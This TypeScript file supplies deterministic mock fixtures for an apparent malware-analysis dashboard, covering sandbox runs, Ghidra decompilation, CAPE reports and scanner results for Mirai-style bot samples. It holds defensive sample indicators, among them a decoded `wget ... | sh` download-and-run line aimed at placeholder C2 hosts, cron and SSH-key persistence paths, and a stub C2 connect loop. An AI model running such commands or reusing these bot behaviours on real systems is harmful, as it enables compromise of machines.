// Per-sample analysis fixtures. Each is generated from the payload hash, so a
// sample always shows the same results wherever it is opened.
import type {
  CapeRun,
  CapturedPayload,
  GhidraAnalysis,
  GithubAnalysis,
  GithubStatus,
  PayloadAnalysis,
  RevDeckRun,
  SandboxRun,
} from '../types'
import { ANALYSIS_RESULTS, PAYLOADS } from './operations'
import { createRng, hex, int, isoMinutesAgo, pick } from './random'
import type { Rng } from './random'

const seedFor = (hash: string) => Number.parseInt(hash.slice(0, 8), 16)

const C2_HOSTS = ['cnc.example.test', 'bot.example.test', 'update.example.test', '198.51.100.23', '203.0.113.9']

function iocs(rng: Rng) {
  const host = pick(rng, C2_HOSTS)
  return [
    { id: 'i1', kind: /\d/.test(host[0]) ? ('ip' as const) : ('domain' as const), value: host },
    { id: 'i2', kind: 'url' as const, value: `http://${host}/${pick(rng, ['bins.sh', 'x86', 'arm7', 'mips'])}` },
    { id: 'i3', kind: 'path' as const, value: pick(rng, ['/tmp/.x', '/var/tmp/kworker', '/dev/shm/.s']) },
  ]
}

function hexDump(rng: Rng, payload: CapturedPayload, length: number): string {
  const header = payload.kind === 'ELF' ? [0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00] : payload.kind === 'shell script' ? [...'#!/bin/sh\n'].map((c) => c.charCodeAt(0)) : [0x4d, 0x5a, 0x90, 0x00]
  const bytes = [...header, ...Array.from({ length: length - header.length }, () => int(rng, 0, 255))]
  const lines: string[] = []
  for (let offset = 0; offset < bytes.length; offset += 16) {
    const row = bytes.slice(offset, offset + 16)
    lines.push(`${offset.toString(16).padStart(8, '0')}  ${row.map((b) => b.toString(16).padStart(2, '0')).join(' ').padEnd(47)}  |${row.map((b) => (b >= 0x20 && b < 0x7f ? String.fromCharCode(b) : '.')).join('')}|`)
  }
  return lines.join('\n')
}

export function findPayload(hash: string): CapturedPayload | undefined {
  return PAYLOADS.find((p) => p.hash === hash.toLowerCase())
}

const hasResult = (analyzer: string, hash: string) => ANALYSIS_RESULTS.some((r) => r.analyzer === analyzer && r.hash === hash)

export function githubStatusFor(payload: CapturedPayload): GithubStatus | undefined {
  if (!payload.verdict) return undefined
  const roll = seedFor(payload.hash) % 10
  return roll < 7 ? 'published' : roll < 8 ? 'dry_run' : roll < 9 ? 'denylist_blocked' : 'quota_exceeded'
}

export function buildPayloadAnalysis(payload: CapturedPayload): PayloadAnalysis {
  const rng = createRng(seedFor(payload.hash))
  const risk = payload.verdict?.label === 'malicious' ? int(rng, 70, 98) : payload.verdict?.label === 'suspicious' ? int(rng, 40, 69) : int(rng, 5, 35)
  const sandbox = ANALYSIS_RESULTS.find((r) => r.analyzer === 'sandbox' && r.hash === payload.hash)
  const github = GITHUB_ANALYSES.find((g) => g.sha === payload.hash)
  return {
    payload,
    staticRisk: risk,
    packingLikelihood: int(rng, 3, 95),
    hashes: { md5: hex(rng, 32), sha1: hex(rng, 40), sha256: payload.hash, ssdeep: `96:${hex(rng, 20)}:${hex(rng, 12)}`, tlsh: `T1${hex(rng, 70).toUpperCase()}` },
    fileType: payload.kind === 'ELF' ? `ELF 32-bit LSB executable, ${payload.platform.split('/')[1] ?? 'x86'}, statically linked, stripped` : payload.kind === 'shell script' ? 'POSIX shell script, ASCII text executable' : 'PE32 executable (GUI) Intel 80386, for MS Windows',
    entryPoint: payload.kind === 'shell script' ? undefined : `0x${hex(rng, 6)}`,
    classification: payload.kind === 'shell script' ? pick(rng, ['dropper: downloads and executes per-arch binaries', 'miner installer', 'persistence: adds cron + ssh key']) : undefined,
    yara: payload.verdict?.label === 'malicious' ? [`${payload.verdict.family ?? 'Generic'}_Bot`, ...(rng() < 0.4 ? ['UPX_Packed'] : [])] : [],
    iocs: iocs(rng),
    strings: ['/bin/busybox', 'POST /cdn-cgi/', 'User-Agent: Mozilla/5.0', 'HTTP/1.1', '/proc/net/tcp', 'GETLOCALIP', 'KILLATTK', 'LOLNOGTFO'].slice(0, int(rng, 4, 8)),
    decoded: [
      { encoding: 'base64', value: `wget http://${pick(rng, C2_HOSTS)}/x -O- | sh` },
      { encoding: 'xor 0x22', value: pick(rng, ['/etc/rc.local', 'watchdog', 'dvrHelper']) },
    ],
    sections: payload.kind === 'shell script' ? [] : ['.text', '.rodata', '.data', '.bss'].map((name) => ({ name, size: int(rng, 200, 90_000), entropy: Math.round((3 + rng() * 4.9) * 100) / 100 })),
    preview: hexDump(rng, payload, 128),
    sandbox: sandbox ? { job: payload.hash, risk: sandbox.risk ?? 0, verdict: sandboxVerdict(sandbox.risk ?? 0) } : undefined,
    ghidra: hasResult('ghidra', payload.hash),
    github: github ? { status: github.status, detections: github.detections, engines: github.engines } : undefined,
  }
}

/** One verdict scale for sandbox risk, shared by every page that shows it. */
function sandboxVerdict(risk: number): SandboxRun['verdict'] {
  return risk > 70 ? 'malicious' : risk > 40 ? 'suspicious' : 'benign'
}

export function buildSandboxRun(payload: CapturedPayload): SandboxRun {
  const rng = createRng(seedFor(payload.hash) ^ 0x5a5a)
  const risk = ANALYSIS_RESULTS.find((r) => r.analyzer === 'sandbox' && r.hash === payload.hash)?.risk ?? int(rng, 20, 90)
  const host = pick(rng, C2_HOSTS)
  return {
    job: payload.hash,
    hash: payload.hash,
    at: isoMinutesAgo(int(rng, 30, 3000)),
    verdict: sandboxVerdict(risk),
    risk,
    platform: payload.platform,
    durationSeconds: int(rng, 60, 300),
    packets: int(rng, 40, 4000),
    changedPaths: ['/tmp/.x', '/etc/crontab', '/root/.ssh/authorized_keys', '/var/tmp/kworker'].slice(0, int(rng, 1, 4)),
    syscalls: ['connect', 'socket', 'fork', 'execve', 'open', 'write', 'kill'].map((name) => ({ id: name, label: name, count: int(rng, 1, 900) })).sort((a, b) => b.count - a.count),
    processesAdded: ['sh -c ./x', 'kworker/0:1 (masquerade)', 'crontab -'].slice(0, int(rng, 1, 3)),
    socketsAdded: [`tcp ${host}:${pick(rng, [23, 80, 443, 6667])} ESTABLISHED`],
    output: 'listening tun0\nconnected to C2\nattack module loaded: udpflood',
    dns: [host.match(/\d/) ? 'none' : host],
    connections: Array.from({ length: int(rng, 1, 4) }, () => ({ proto: pick(rng, ['tcp', 'udp']), dst: host, port: pick(rng, [23, 80, 443, 6667, 53]), bytes: int(rng, 60, 90_000) })),
    iocsStatic: [host, '/tmp/.x'],
    iocsDynamic: [host, `${host}:6667`],
    techniques: [
      { id: 'T1059.004', name: 'Unix Shell', tactic: 'Execution', events: int(rng, 1, 5) },
      { id: 'T1071.001', name: 'Web Protocols', tactic: 'Command and Control', events: int(rng, 1, 9) },
      { id: 'T1053.003', name: 'Cron', tactic: 'Persistence', events: int(rng, 0, 2) },
    ].filter((t) => t.events > 0),
    diagnostics: { vm: 'qemu-x86_64', snapshot: 'clean-2026-09-01', 'packet capture': 'complete', 'guest agent': 'ok', network: 'sinkholed (fake DNS + INetSim)' },
    ...sandboxForensics(payload, host),
    // A Windows detonation reports Windows things: its own paths, API
    // calls and guest, not the Linux defaults above.
    ...(payload.kind === 'PE32'
      ? {
          changedPaths: ['C:\\Users\\user\\AppData\\Local\\Temp\\svchost.exe', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update', 'C:\\Windows\\System32\\Tasks\\Update'],
          syscalls: ['NtCreateFile', 'NtWriteVirtualMemory', 'NtCreateThreadEx', 'NtSetValueKey', 'NtConnectPort', 'NtAllocateVirtualMemory'].map((name) => ({ id: name, label: name, count: int(rng, 1, 900) })).sort((a, b) => b.count - a.count),
          processesAdded: ['svchost.exe (from Temp)', 'schtasks.exe'],
          iocsStatic: [host, `http://${host}/update.bin`],
          output: '',
          diagnostics: { vm: 'win10-22h2-x64 (KVM)', snapshot: 'golden-2026-09-10', 'packet capture': 'complete', 'guest agent': 'ok', network: 'sinkholed (fake DNS + INetSim)' },
        }
      : {}),
  }
}

/** The rest of a run's record: route, process and socket diffs, both packet
 * captures, static indicators, the run's own logs, exported files, and for
 * Windows samples the PE forensics. Its own random stream, so adding it
 * never reshuffles the fields above. */
function sandboxForensics(payload: CapturedPayload, host: string): Omit<SandboxRun, 'job' | 'hash' | 'at' | 'verdict' | 'risk' | 'platform' | 'durationSeconds' | 'packets' | 'changedPaths' | 'syscalls' | 'processesAdded' | 'socketsAdded' | 'output' | 'dns' | 'connections' | 'iocsStatic' | 'iocsDynamic' | 'techniques' | 'diagnostics'> {
  const rng = createRng(seedFor(payload.hash) ^ 0x5b5b)
  const windows = payload.kind === 'PE32'
  const port = pick(rng, [23, 80, 443, 6667])
  const guestIp = '10.0.2.15'
  const tcpdumpLine = (i: number, proto: string, dst: string) => `12:0${Math.floor(i / 10)}:${String(10 + (i % 50)).padStart(2, '0')}.${hex(rng, 6)} IP ${guestIp}.${40000 + i} > ${dst}: ${proto}`
  return {
    route: windows ? { name: 'windows-kvm', vm: 'win10-22h2-x64', snapshot: 'golden-2026-09-10' } : { name: 'linux-qemu', vm: `qemu-${payload.platform.includes('arm') ? 'arm' : payload.platform.includes('mips') ? 'mips' : 'x86_64'}`, snapshot: 'clean-2026-09-01' },
    processes: windows ? { added: ['C:\\Users\\user\\AppData\\Local\\Temp\\svchost.exe', 'cmd.exe /c schtasks /create /tn Update /tr ...'], removed: [] } : { added: ['/tmp/.x', 'sh -c ./x', 'kworker/0:1 (masquerade)'].slice(0, int(rng, 1, 3)), removed: ['telnetd'] },
    sockets: windows
      ? { before: ['TCP 0.0.0.0:135 LISTEN', 'TCP 0.0.0.0:445 LISTEN'], after: ['TCP 0.0.0.0:135 LISTEN', 'TCP 0.0.0.0:445 LISTEN', `TCP ${guestIp}:49712 ${host}:${port} ESTABLISHED`] }
      : { before: ['tcp 0.0.0.0:22 LISTEN'], after: ['tcp 0.0.0.0:22 LISTEN', `tcp ${guestIp}:${int(rng, 40000, 60000)} ${host}:${port} ESTABLISHED`, 'udp 0.0.0.0:0 (raw, flood)'] },
    stdout: windows ? '' : 'listening tun0\nconnected to C2\nattack module loaded: udpflood\n',
    stderr: rng() < 0.3 ? 'sh: /proc/sys/kernel/randomize_va_space: Permission denied\n' : '',
    network: {
      bytes: int(rng, 4_000, 900_000),
      protocols: [
        { id: 'tcp', label: 'tcp', count: int(rng, 20, 800) },
        { id: 'udp', label: 'udp', count: int(rng, 10, 3000) },
        { id: 'dns', label: 'dns', count: int(rng, 1, 12) },
      ],
      remoteIps: [host.match(/\d/) ? host : '198.51.100.23', '203.0.113.200'],
      hostEvents: Array.from({ length: 6 }, (_, i) => tcpdumpLine(i, i % 3 === 2 ? 'UDP, length 1458' : `Flags [S], seq ${int(rng, 1e8, 9e8)}`, `${host}.${port}`)),
      attempts: [`connect(${host}:${port}) = 0`, 'connect(203.0.113.200:80) = -1 ETIMEDOUT'],
      guest: {
        packets: int(rng, 30, 2000),
        pcapBytes: int(rng, 10_000, 1_200_000),
        protocols: [
          { id: 'tcp', label: 'tcp', count: int(rng, 20, 600) },
          { id: 'udp', label: 'udp', count: int(rng, 10, 1500) },
        ],
        events: Array.from({ length: 4 }, (_, i) => tcpdumpLine(i + 10, 'UDP, length 512', `203.0.113.${int(rng, 1, 254)}.${int(rng, 1, 65535)}`)),
      },
    },
    staticIocs: {
      remoteIps: [host.match(/\d/) ? host : '198.51.100.23'],
      uncPaths: windows ? ['\\\\192.0.2.66\\share\\payload.dll'] : [],
      downloadUrls: [`http://${host}/bins.sh`],
      downloadCradles: windows ? 1 : int(rng, 0, 3),
    },
    ...(windows
      ? {
          windows: {
            peType: 'PE32',
            machine: 'IMAGE_FILE_MACHINE_I386',
            subsystem: 'WINDOWS_GUI',
            imageBase: '0x00400000',
            entryPoint: `0x${(0x401000 + int(rng, 0, 0x4000)).toString(16)}`,
            compileTimestamp: isoMinutesAgo(int(rng, 60 * 24 * 30, 60 * 24 * 900)),
            imphash: hex(rng, 32),
            isDll: false,
            signaturePresent: rng() < 0.3,
            authenticode: 'Signature: present\nSigner: CN=Example Software Ltd (self-signed)\nChain: untrusted root\nTimestamp: none\nVerdict: not trusted',
            suspiciousImports: [
              { name: 'VirtualAllocEx', library: 'KERNEL32.dll', why: 'allocates memory in another process' },
              { name: 'WriteProcessMemory', library: 'KERNEL32.dll', why: 'writes into another process: injection' },
              { name: 'CreateRemoteThread', library: 'KERNEL32.dll', why: 'runs code in another process' },
              { name: 'URLDownloadToFileA', library: 'urlmon.dll', why: 'download cradle' },
            ],
            sections: [
              { name: '.text', virtualSize: 0x3a2c0, rawSize: 0x3a400, entropy: 6.41, characteristics: 'CODE | EXECUTE | READ' },
              { name: '.rdata', virtualSize: 0x9a10, rawSize: 0x9c00, entropy: 5.12, characteristics: 'INITIALIZED_DATA | READ' },
              { name: '.data', virtualSize: 0x2f40, rawSize: 0x1000, entropy: 3.02, characteristics: 'INITIALIZED_DATA | READ | WRITE' },
              { name: 'UPX1', virtualSize: 0x18000, rawSize: 0x17e00, entropy: 7.93, characteristics: 'CODE | EXECUTE | READ | WRITE' },
            ],
            imports: [
              { library: 'KERNEL32.dll', symbols: ['VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread', 'GetProcAddress', 'LoadLibraryA'] },
              { library: 'urlmon.dll', symbols: ['URLDownloadToFileA'] },
              { library: 'ADVAPI32.dll', symbols: ['RegSetValueExA', 'RegOpenKeyExA'] },
            ],
            exports: [],
            warnings: ['Section UPX1 is writable and executable', 'Entropy 7.93 in UPX1: packed', 'Checksum mismatch'],
            asciiStrings: ['This program cannot be run in DOS mode.', 'UPX!', `http://${host}/update.bin`, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'],
            utf16Strings: ['svchost.exe', 'schtasks /create /tn Update'],
            exiftool: `File Type                       : Win32 EXE\nMachine Type                    : Intel 386 or later\nTime Stamp                      : 2025:04:19 03:12:44+00:00\nPE Type                         : PE32\nLinker Version                  : 14.29\nSubsystem                       : Windows GUI\nFile Version                    : 10.0.19041.1\nOriginal File Name              : svchost.exe\nCompany Name                    : Microsoft Corporation`,
          },
        }
      : {}),
    logs: {
      kernel: windows ? 'Windows 10 22H2 build 19045.3803 (guest)' : `Linux version 5.10.0 (buildroot) #1 SMP ${payload.platform}\n[    0.000000] Booting Linux on physical CPU 0x0`,
      hostTcpdump: 'tcpdump: listening on br-sandbox, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n6 packets captured',
      guestTcpdump: 'tcpdump: listening on eth0, link-type EN10MB (Ethernet)\n4 packets captured',
      serialConsole: windows ? '' : 'buildroot login: root (automatic login)\n# ./sample &\n# ',
      qemu: 'qemu-system: -netdev tap,id=net0: running\nqemu-system: guest shutdown requested at t+180s',
      domainState: 'shut off (shutdown)\nqemu status: exited 0',
      ...(rng() < 0.15 ? { classifierError: 'classifier: model not loaded; verdict from rules only' } : {}),
      ...(windows && rng() < 0.3 ? { peParserError: 'pefile: section UPX1 raw size exceeds file; parsed with warnings' } : {}),
    },
    exported: [
      { name: 'behavior.json', size: int(rng, 8_000, 90_000), sha256: hex(rng, 64) },
      { name: 'host.pcap', size: int(rng, 10_000, 900_000), sha256: hex(rng, 64) },
      { name: 'guest.pcap', size: int(rng, 10_000, 1_200_000), sha256: hex(rng, 64) },
      { name: 'console.log', size: int(rng, 500, 20_000), sha256: hex(rng, 64) },
    ],
  }
}

const DECOMPILED = (name: string, host: string) => `void ${name}(void)
{
  int fd;
  struct sockaddr_in addr;

  fd = socket(AF_INET, SOCK_STREAM, 0);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(23);
  inet_pton(AF_INET, "${host}", &addr.sin_addr);
  while (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    sleep(5);
  }
  handle_commands(fd);
}`

/** Who calls whom in the decompiled bot: main fans out to setup and the
 * C2 loop, the command handler reaches the attack vectors. */
const CALL_GRAPH: Record<string, string[]> = {
  main: ['killer_init', 'scanner_init', 'table_unlock_val', 'connect_cnc'],
  connect_cnc: ['resolve_cnc_addr', 'handle_commands'],
  resolve_cnc_addr: ['table_unlock_val'],
  handle_commands: ['attack_udp', 'attack_syn', 'util_strlen'],
  scanner_init: ['util_strlen'],
  killer_init: [],
  table_unlock_val: [],
  attack_udp: [],
  attack_syn: [],
  util_strlen: [],
}

const SIGNATURES: Record<string, string> = {
  main: 'int main(int argc, char **argv)',
  connect_cnc: 'void connect_cnc(void)',
  resolve_cnc_addr: 'uint32_t resolve_cnc_addr(void)',
  handle_commands: 'void handle_commands(int fd)',
  scanner_init: 'void scanner_init(void)',
  killer_init: 'void killer_init(void)',
  table_unlock_val: 'void table_unlock_val(uint8_t id)',
  attack_udp: 'void attack_udp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)',
  attack_syn: 'void attack_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)',
  util_strlen: 'int util_strlen(char *str)',
}

const evidence = (flossOnly: string[], sandboxStaticOnly: string[], confirmedAtRuntime: string[]) => ({ flossOnly, sandboxStaticOnly, confirmedAtRuntime })

export function buildGhidraAnalysis(payload: CapturedPayload): GhidraAnalysis {
  const rng = createRng(seedFor(payload.hash) ^ 0x9d9d)
  const host = pick(rng, C2_HOSTS)
  const names = Object.keys(CALL_GRAPH)
  const callersOf = (name: string) => names.filter((n) => CALL_GRAPH[n].includes(name))
  const pe = payload.kind === 'PE32'
  const requested = int(rng, 60, 4000)
  const failed = rng() < 0.08
  const functions = names.map((name) => ({
    name,
    address: `0x${(0x401000 + names.indexOf(name) * 0x1a0 + int(rng, 0, 0x90)).toString(16)}`,
    size: int(rng, 40, 2400),
    calls: CALL_GRAPH[name].length,
    signature: SIGNATURES[name],
    callers: callersOf(name),
    callees: CALL_GRAPH[name],
    decompiled: DECOMPILED(name, host),
  }))
  const family = payload.verdict?.family ?? 'Mirai'
  const staticStrings = ['/bin/busybox', 'KILLATTK', 'LOLNOGTFO', '/proc/net/tcp', 'GETLOCALIP', 'enable', 'system', 'shell', 'sh', host]
  return {
    hash: payload.hash,
    at: isoMinutesAgo(requested - 4),
    arch: payload.platform,
    run: {
      requestedAt: isoMinutesAgo(requested),
      startedAt: isoMinutesAgo(requested - 1),
      completedAt: isoMinutesAgo(requested - 4),
      exitStatus: failed ? 'error' : 'ok',
      ...(failed ? { error: 'Decompiler timed out on 3 functions; results are partial.' } : {}),
    },
    functionsTotal: int(rng, 180, 420),
    functions,
    imports: ['socket', 'connect', 'fork', 'execve', 'sleep', 'kill', 'inet_pton'].map((name) => ({ id: name, label: name, count: int(rng, 1, 40) })),
    strings: staticStrings,
    cryptoConstants: rng() < 0.5 ? [{ name: 'ChaCha20 sigma', address: `0x${hex(rng, 6)}`, algorithm: 'ChaCha20' }] : [],
    fuzzy: { ssdeep: `96:${hex(rng, 24)}`, tlsh: `T1${hex(rng, 64).toUpperCase()}`, imphash: hex(rng, 32) },
    lief: {
      format: pe ? 'PE' : 'ELF',
      architecture: payload.platform,
      entrypoint: `0x${(0x400194 + int(rng, 0, 0x40)).toString(16)}`,
      isPie: !pe && rng() < 0.3,
      stripped: rng() < 0.8,
      isDll: pe ? false : null,
      compileTimestamp: pe ? isoMinutesAgo(int(rng, 60 * 24 * 20, 60 * 24 * 400)) : null,
      sectionCount: int(rng, 5, 14),
      libraries: pe ? ['KERNEL32.dll', 'WS2_32.dll', 'ADVAPI32.dll'] : [],
    },
    capa: [
      { capability: 'create TCP socket', namespace: 'communication/socket/tcp', matches: int(rng, 1, 6), attck: 'T1095' },
      { capability: 'terminate process', namespace: 'host-interaction/process/terminate', matches: int(rng, 1, 4) },
      { capability: 'encode data using XOR', namespace: 'data-manipulation/encoding/xor', matches: int(rng, 1, 9), attck: 'T1027' },
      { capability: 'enumerate processes', namespace: 'host-interaction/process/list', matches: int(rng, 1, 3), attck: 'T1057' },
      { capability: 'send data on socket', namespace: 'communication/socket/send', matches: int(rng, 2, 12) },
    ],
    capaAttack: [
      { id: 'T1095', tactic: 'Command and Control', technique: 'Non-Application Layer Protocol' },
      { id: 'T1027', tactic: 'Defense Evasion', technique: 'Obfuscated Files or Information' },
      { id: 'T1057', tactic: 'Discovery', technique: 'Process Discovery' },
    ],
    capaMbc: [
      { id: 'C0001.004', objective: 'Communication', behavior: 'Socket Communication::Create TCP Socket' },
      { id: 'C0026.002', objective: 'Data', behavior: 'Encode Data::XOR' },
      { id: 'E1057', objective: 'Discovery', behavior: 'Process Discovery' },
    ],
    floss: {
      decoded: ['/etc/rc.local', 'watchdog', host],
      stack: ['cnc', host],
      tight: ['KILLATTK'],
      static: staticStrings,
      totals: { decoded: 3, stack: 2, tight: 1, static: int(rng, 180, 900) },
      truncated: true,
    },
    iocCorrelation: {
      hasSandboxRun: rng() < 0.8,
      ips: evidence([], [], /\d/.test(host) ? [host] : []),
      domains: evidence(/\d/.test(host) ? [] : [host], [], []),
      urls: evidence([`http://${host}/bins.sh`], [], []),
      uncPaths: evidence([], [], []),
    },
    aiTriage: {
      summary: `${family}-lineage bot: resolves ${host}, connects on port 23, waits for attack commands (UDP/SYN floods), and kills competing processes. No persistence of its own.`,
      model: 'qwen2.5-coder:14b',
      confidence: pick(rng, ['medium', 'high'] as const),
      familyGuess: `${family} (variant)`,
      behaviors: ['C2 over raw TCP', 'UDP and SYN flood modules', 'kills competing bots', 'telnet scanner'],
    },
    types: [
      { name: 'attack_target', kind: 'struct', size: 16, fields: [{ name: 'sock_addr', type: 'struct sockaddr_in', offset: 0, size: 8 }, { name: 'addr', type: 'uint32_t', offset: 8, size: 4 }, { name: 'netmask', type: 'uint8_t', offset: 12, size: 1 }] },
      { name: 'attack_option', kind: 'struct', size: 8, fields: [{ name: 'val', type: 'char *', offset: 0, size: 4 }, { name: 'key', type: 'uint8_t', offset: 4, size: 1 }] },
      { name: 'ATTACK_VECTOR', kind: 'enum', size: 1, fields: [{ name: 'ATK_VEC_UDP', type: '0', offset: 0, size: 1 }, { name: 'ATK_VEC_SYN', type: '3', offset: 0, size: 1 }] },
    ],
    globals: [
      { address: `0x${hex(rng, 6)}`, name: 'table', type: 'struct table_value[64]', size: 512 },
      { address: `0x${hex(rng, 6)}`, name: 'methods', type: 'struct attack_method *', size: 4 },
      { address: `0x${hex(rng, 6)}`, name: 'fd_serv', type: 'int', size: 4 },
      { address: `0x${hex(rng, 6)}`, name: 'LOCAL_ADDR', type: 'uint32_t', size: 4 },
    ],
    annotations: {
      revision: int(rng, 2, 9),
      entries: [
        { address: functions[1].address, displayName: 'C2 connect loop', comment: `Retries every 5 s until ${host} answers.`, tags: ['c2', 'network'] },
        { address: functions[3].address, displayName: 'command dispatcher', comment: 'Parses the attack command and looks up the vector in the methods table.', tags: ['c2'] },
        { address: functions[6].address, displayName: 'string table decode', comment: 'XOR 0xdeadbeef over the obfuscated config table.', tags: ['obfuscation'] },
      ],
    },
    memoryMap: [
      { name: '.text', start: '0x00400000', end: '0x0040d4c3', size: 0xd4c4, permissions: 'r-x', hex: '7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00', ascii: '.ELF............' },
      { name: '.rodata', start: '0x0040d4c4', end: '0x0040f1ff', size: 0x1d3c, permissions: 'r--', hex: '2f 62 69 6e 2f 62 75 73 79 62 6f 78 00 4b 49 4c', ascii: '/bin/busybox.KIL' },
      { name: '.data', start: '0x00420000', end: '0x004201ff', size: 0x200, permissions: 'rw-', hex: '00 00 00 00 17 00 00 00 50 00 00 00 bb 01 00 00', ascii: '........P.......' },
      { name: '.bss', start: '0x00420200', end: '0x00424fff', size: 0x4e00, permissions: 'rw-', hex: '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00', ascii: '................' },
    ],
    chat: {
      threads: [
        { id: 't1', title: 'What does the command handler do?', messageCount: 4 },
        { id: 't2', title: 'Is there a kill switch?', messageCount: 2 },
      ],
      messages: [
        { role: 'user', content: 'What does handle_commands do with the bytes it reads?' },
        { role: 'tool', tool: 'decompile', content: `handle_commands @ ${functions[3].address}: reads a length-prefixed buffer, calls attack_parse` },
        { role: 'assistant', content: `It reads a length-prefixed command from the C2 socket and dispatches it: the first byte picks the attack vector (UDP or SYN flood), the rest are targets and options. [cite: handle_commands@${functions[3].address}]` },
        { role: 'user', content: 'Does it persist?' },
      ],
    },
    symbolRecovery: {
      matched: int(rng, 30, 90),
      total: int(rng, 180, 420),
      candidates: [
        { address: `0x${hex(rng, 6)}`, recovered: 'util_memcpy', confidence: 0.94, source: 'FLIRT (uclibc)' },
        { address: `0x${hex(rng, 6)}`, recovered: 'rand_next', confidence: 0.81, source: 'BSim similarity' },
        { address: `0x${hex(rng, 6)}`, recovered: 'attack_gre_ip', confidence: 0.62, source: 'RevDeck (LLM, unverified)' },
      ],
    },
  }
}

export const REVDECK_RUNS: RevDeckRun[] = PAYLOADS.filter((p) => p.kind !== 'shell script').filter((_, i) => i % 2 === 0).map((payload, i) => {
  const rng = createRng(seedFor(payload.hash) ^ 0x7e7e)
  const failed = i === 4
  return {
    sha: payload.hash,
    at: isoMinutesAgo(i * 210 + int(rng, 0, 90)),
    status: failed ? 'failed' : 'completed',
    verdict: failed ? '—' : pick(rng, ['botnet client', 'dropper', 'cryptominer loader']),
    summary: failed ? '' : 'Walked main → connect_cnc → handle_commands; command table decodes to flood vectors. Kill-switch string present but unused.',
    steps: failed
      ? []
      : [
          { tool: 'list_functions', input: '{}', output: '212 functions, 10 named' },
          { tool: 'decompile', input: '{"name":"main"}', output: 'calls connect_cnc, killer_init' },
          { tool: 'xrefs_to', input: '{"name":"attack_udp"}', output: 'referenced from handle_commands table' },
          { tool: 'strings', input: '{"min":6}', output: 'KILLATTK, LOLNOGTFO, /bin/busybox' },
        ],
    citations: { valid: failed ? [] : ['main@0x401000', 'handle_commands@0x401a20'], invalid: failed ? [] : rng() < 0.4 ? ['attack_http@0x402000'] : [] },
    error: failed ? 'Ghidra REST service timed out after 600s' : undefined,
  }
})

// Windows samples, plus a few others submitted to CAPE by hand (deduped).
const CAPE_SAMPLES = [...new Set([...PAYLOADS.filter((p) => p.kind === 'PE32'), ...PAYLOADS.slice(0, 3)])]

export const CAPE_RUNS: CapeRun[] = CAPE_SAMPLES.map((payload, i): CapeRun => {
  const rng = createRng(seedFor(payload.hash) ^ 0xca9e)
  const failed = i === 2
  return {
    sha: payload.hash,
    at: isoMinutesAgo(i * 330 + int(rng, 0, 120)),
    status: failed ? 'failed_analysis' : 'reported',
    malscore: failed ? 0 : Math.round(rng() * 100) / 10,
    signatures: failed
      ? []
      : [
          { name: 'antidebug_guardpages', severity: 3, description: 'Uses guard pages to detect a debugger' },
          { name: 'injection_runpe', severity: 3, description: 'Executed a process and injected code (RunPE)' },
          { name: 'network_cnc_http', severity: 2, description: 'HTTP traffic to a known C2 pattern' },
        ].slice(0, int(rng, 1, 3)),
    processes: failed ? [] : [{ pid: 2144, name: 'sample.exe', commandLine: '"C:\\Users\\user\\AppData\\Local\\Temp\\sample.exe"' }, { pid: 2210, name: 'svchost.exe', commandLine: 'svchost.exe -k netsvcs' }],
    dumps: failed ? [] : [`${hex(rng, 64)} (injected PE)`],
    config: failed ? {} : { family: pick(rng, ['AgentTesla', 'Remcos', 'AsyncRAT']), c2: pick(rng, C2_HOSTS), mutex: `Global\\${hex(rng, 8)}` },
    log: failed ? 'Analysis aborted: guest did not respond within timeout' : 'Task completed; 2 processes traced; 1 dump extracted',
  }
})

/** The public analysis repository (a placeholder host: this repo is public). */
const GITHUB_REPO = 'https://github.example.test/apiary/samples'

export const GITHUB_ANALYSES: GithubAnalysis[] = PAYLOADS.filter((p) => githubStatusFor(p)).map((payload) => {
  const rng = createRng(seedFor(payload.hash) ^ 0x61a1)
  const status = githubStatusFor(payload)!
  const engines = 64
  const detections = status === 'published' ? int(rng, 8, 52) : 0
  const engineNames = ['ESET', 'Kaspersky', 'Microsoft', 'Sophos', 'ClamAV', 'BitDefender', 'Avast', 'DrWeb', 'Fortinet', 'Symantec']
  return {
    sha: payload.hash,
    at: isoMinutesAgo(int(rng, 100, 6000)),
    status,
    detections,
    engines,
    risk: detections > 30 ? 'high' : detections > 10 ? 'medium' : 'low',
    family: payload.verdict?.family,
    results: engineNames.map((engine) => {
      const hit = status === 'published' && rng() < detections / engines + 0.3
      const verdict = hit ? 'malicious' : rng() < 0.1 ? 'suspicious' : 'undetected'
      return {
        engine,
        verdict,
        label: hit ? `Linux/${payload.verdict?.family ?? 'Agent'}.${hex(rng, 2).toUpperCase()}` : undefined,
        permalink: status === 'published' ? `https://scanners.example.test/${engine.toLowerCase()}/file/${payload.hash}` : undefined,
      }
    }),
    yaraRules: status === 'published' ? [`auto_${payload.hash.slice(0, 8)}_strings`, `auto_${payload.hash.slice(0, 8)}_opcodes`] : [],
    repoPath: `samples/${payload.hash.slice(0, 2)}/${payload.hash}`,
    // Derived from the hash, not drawn: the seeded draws above stay as they were.
    ...(status === 'published' ? { commit: { sha: payload.hash.slice(24, 64), url: `${GITHUB_REPO}/commit/${payload.hash.slice(24, 64)}` }, runUrl: `${GITHUB_REPO}/actions/runs/${parseInt(payload.hash.slice(0, 8), 16)}` } : {}),
  }
})
